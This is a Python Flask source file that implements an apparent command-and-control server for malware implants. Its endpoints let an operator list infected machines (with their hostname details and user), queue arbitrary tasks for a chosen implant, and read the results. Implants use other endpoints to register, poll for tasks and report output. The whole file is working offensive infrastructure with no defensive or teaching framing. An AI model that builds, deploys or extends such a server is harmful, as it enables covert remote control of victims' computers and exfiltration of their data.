import sqlite3
from flask import Flask, request, jsonify, abort
import datetime
import uuid
import json
app = Flask(__name__)
DATABASE = "my_database.db"


@app.route('/list_implants', methods=['GET'])
def list_implants():
    # Create a connection to the database
    conn = sqlite3.connect(DATABASE)

    # Create a cursor object
    c = conn.cursor()

    # Execute a SELECT query to retrieve all the implants
    c.execute('SELECT * FROM implants')

    # Fetch all the results as a list of tuples
    results = c.fetchall()

    # Close the cursor and the connection
    c.close()
    conn.close()

    # Convert the results to a list of dictionaries
    implants = []
    for row in results:
        implants.append({
            'implant_machine_id': row[0],
            'implant_build_id': row[1],
            'implant_uname': row[2],
            'implant_user': row[3],
            'first_seen': row[4],
            'last_seen': row[5]
        })

    # Return the list of implants as JSON
    return jsonify({'implants': implants})



@app.route('/list_tasks', methods=['GET'])
def list_tasks():
    # Create a connection to the database
    conn = sqlite3.connect(DATABASE)

    # Create a cursor object
    c = conn.cursor()

    # Check if the machine_id query parameter is provided
    machine_id = request.args.get('machine_id')
    if machine_id:
        # Execute a SELECT query to retrieve tasks for a specific implant
        c.execute('SELECT implant_machine_id, task_uuid, task_data, task_created_time, task_status, task_executed_time FROM tasks WHERE implant_machine_id=?', (machine_id,))
    else:
        # Execute a SELECT query to retrieve all tasks, but omitting the task_result column
        c.execute('SELECT implant_machine_id, task_uuid, task_data, task_created_time, task_status, task_executed_time FROM tasks')

    # Fetch all the results as a list of tuples
    results = c.fetchall()

    # Close the cursor and the connection
    c.close()
    conn.close()

    # Convert the results to a list of dictionaries
    tasks = []
    for row in results:
        tasks.append({
            'implant_machine_id': row[0],
            'task_uuid': row[1],
            'task_data': row[2],
            'task_created_time': row[3],
            'task_status': row[4],
            'task_executed_time': row[5]
        })

    # Return the list of tasks as JSON
    return jsonify({'tasks': tasks})



@app.route('/get_output', methods=['GET'])
def get_output():
    # Create a connection to the database
    conn = sqlite3.connect(DATABASE)

    # Create a cursor object
    c = conn.cursor()

    # Get the task_uuid from the query parameters
    task_uuid = request.args.get('task_uuid')

    # Execute a SELECT query to retrieve the task with the specified task_uuid
    c.execute('SELECT * FROM tasks WHERE task_uuid=?', (task_uuid,))
    task = c.fetchone()

    # Close the cursor and the connection
    c.close()
    conn.close()

    # If no task is found, return a 404 error
    if task is None:
        abort(404)

    # Convert the task tuple to a dictionary
    task_dict = {
        'implant_machine_id': task[0],
        'task_uuid': task[1],
        'task_data': task[2],
        'task_created_time': task[3],
        'task_status': task[4],
        'task_executed_time': task[5],
        'task_result': task[6]
    }

    # Return the task information as JSON
    return jsonify(task_dict)



@app.route('/submit_task', methods=['POST'])
def submit_task():
    # Get the POST data
    implant_machine_id = request.form['implant_machine_id']
    task_data = request.form['task_data']

    # Generate a new UUID for the task
    task_uuid = str(uuid.uuid4())

    # Get the current datetime
    current_time = datetime.datetime.now()

    # Create a connection to the database
    conn = sqlite3.connect(DATABASE)

    # Create a cursor object
    c = conn.cursor()

    # Execute an INSERT query to create a new task entry
    c.execute('INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)', (implant_machine_id, task_uuid, task_data, current_time, 0, None, None))

    # Commit the transaction
    conn.commit()

    # Close the cursor and the connection
    c.close()
    conn.close()

    # Return the task information as JSON
    return jsonify({'task_uuid': task_uuid, 'implant_machine_id': implant_machine_id})



@app.route('/cancel_task', methods=['GET'])
def cancel_task():
    # Get the task_uuid from the GET parameters
    task_uuid = request.args.get('task_uuid')

    # Create a connection to the database
    conn = sqlite3.connect(DATABASE)

    # Create a cursor object
    c = conn.cursor()

    # Execute a SELECT query to check if the task_uuid exists and its task_status is 0
    c.execute('SELECT task_status FROM tasks WHERE task_uuid=?', (task_uuid,))
    result = c.fetchone()

    if result is None:
        # If the task_uuid doesn't exist, return a 404
        return jsonify({'error': 'Task not found'}), 404
    elif result[0] != 0:
        # If the task_status is not 0, return an error
        return jsonify({'error': 'Task status is not 0, cannot cancel'}), 400
    else:
        # If the task_uuid exists and its task_status is 0, update its status to 3 to cancel it
        c.execute('UPDATE tasks SET task_status=3 WHERE task_uuid=?', (task_uuid,))
        conn.commit()

        # Close the cursor and the connection
        c.close()
        conn.close()

        # Return a success message
        return jsonify({'message': 'Task cancelled successfully'})


#####
##### Implant API begins here.
#####


@app.route('/register', methods=['POST'])
def register():
    try:
        # extract POST parameters
        implant_machine_id = request.form['implant_machine_id']
        implant_build_id = request.form['implant_build_id']
        implant_uname = request.form['implant_uname']
        implant_user = request.form['implant_user']

        # connect to the database
        conn = sqlite3.connect(DATABASE)
        c = conn.cursor()

        # insert values into the implants table
        current_time = datetime.datetime.now()
        c.execute("INSERT INTO implants (implant_machine_id, implant_build_id, implant_uname, implant_user, first_seen, last_seen) VALUES (?, ?, ?, ?, ?, ?)",
                  (implant_machine_id, implant_build_id, implant_uname, implant_user, current_time, current_time))

        # commit the transaction and close the connection
        conn.commit()
        conn.close()

        # return success message
        response = {'message': 'Registration successful'}
        return jsonify(response), 200

    except Exception as e:
        # if an error occurs, return error message
        response = {'message': 'Error: ' + str(e)}
        return jsonify(response), 400



# get task
@app.route('/get_task', methods=['POST'])
def get_task():
    implant_machine_id = request.form['implant_machine_id']

    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()

    # Update last seen time for the given implant
    cursor.execute("UPDATE implants SET last_seen = ? WHERE implant_machine_id = ?",
                   (datetime.datetime.now(), implant_machine_id))
    print("update?")
    conn.commit()
    # Find the next task for this implant
    cursor.execute("SELECT task_uuid, task_data FROM tasks WHERE implant_machine_id = ? AND task_status = 0 ORDER BY task_created_time ASC LIMIT 1",
                   (implant_machine_id,))
    task = cursor.fetchone()

    if task is None:
        return jsonify({'error': 'No task available for this implant'}), 404

    # Update the task status to 1
    task_uuid, task_data = task
    cursor.execute("UPDATE tasks SET task_status = 1 WHERE task_uuid = ?",
                   (task_uuid,))

    conn.commit()
    conn.close()

    return jsonify({'task_uuid': task_uuid, 'task_data': task_data})


# submit result
@app.route('/submit_result', methods=['POST'])
def submit_result():
    # get parameters from POST request
    implant_machine_id = request.form['implant_machine_id']
    task_result = request.form['task_result']
    task_uuid = request.form['task_uuid']

    # update implants table's "last_seen" marker
    conn = sqlite3.connect(DATABASE)
    cur = conn.cursor()
    cur.execute('UPDATE implants SET last_seen=? WHERE implant_machine_id=?', (datetime.datetime.now(), implant_machine_id))
    conn.commit()

    # update tasks table's appropriate row with "task_result" data
    cur.execute('UPDATE tasks SET task_result=?, task_status=?, task_executed_time=? WHERE task_uuid=?', (task_result, 2, datetime.datetime.now(), task_uuid))
    conn.commit()

    # return success message as JSON
    response = {'message': 'Task result submitted successfully.'}
    return jsonify(response)

if __name__ == "__main__":
    app.run(host='0.0.0.0')
